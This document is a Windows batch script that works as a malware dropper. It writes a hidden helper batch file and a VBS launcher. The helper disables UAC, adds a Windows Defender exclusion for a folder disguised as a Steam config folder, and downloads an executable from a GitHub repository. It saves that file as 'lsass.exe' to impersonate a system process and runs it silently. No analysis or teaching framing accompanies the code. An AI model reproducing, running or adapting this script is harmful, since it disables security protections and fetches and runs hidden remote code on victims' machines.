@echo off
setlocal enabledelayedexpansion

:: Set script and folder paths
set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
set "batchScript=%TEMP%\hidden_runner.bat"
set "vbsScript=%TEMP%\hidden_runner.vbs"

:: Create the batch script that will run the main script
echo @echo off > "%batchScript%"
echo setlocal enabledelayedexpansion >> "%batchScript%"
echo if not exist "%folderPath%" mkdir "%folderPath%" >> "%batchScript%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f ^>nul 2^>^&1 >> "%batchScript%"
echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1 >> "%batchScript%"
echo curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1 >> "%batchScript%"
echo if not exist "%folderPath%\lsass.exe" exit /b 1 >> "%batchScript%"
echo for %%%%F in ("%folderPath%\lsass.exe") do set filesize=%%%%~zF >> "%batchScript%"
echo if "!filesize!"=="0" exit /b 1 >> "%batchScript%"
echo start "" /b "%folderPath%\lsass.exe" >> "%batchScript%"
echo exit >> "%batchScript%"

:: Create the VBS script to run the batch file silently
echo Set objShell = CreateObject("WScript.Shell") > "%vbsScript%"
echo objShell.Run "cmd.exe /c %batchScript%", 0, False >> "%vbsScript%"

:: Run the VBS script
cscript //nologo "%vbsScript%"
exit
